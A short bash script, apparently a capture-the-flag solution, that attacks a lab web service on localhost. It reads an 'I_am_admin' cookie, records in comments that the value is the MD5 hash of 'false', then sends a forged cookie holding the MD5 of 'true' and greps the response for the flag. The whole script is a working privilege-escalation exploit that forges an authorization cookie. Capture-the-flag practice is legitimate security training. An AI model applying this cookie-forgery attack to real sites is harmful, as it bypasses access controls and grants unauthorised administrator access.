#!/bin/bash
curl "http://localhost:10080" -v 1>/dev/null 
# < Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Sun, 15-Apr-2018 22:15:51 GMT
# md5 68934a3e9455fa72420237eb05902327:false
# md5 b326b5062b2f0e69046810717534cb09:true

curl "http://localhost:10080" --cookie "I_am_admin=b326b5062b2f0e69046810717534cb09" -v | grep -i flag
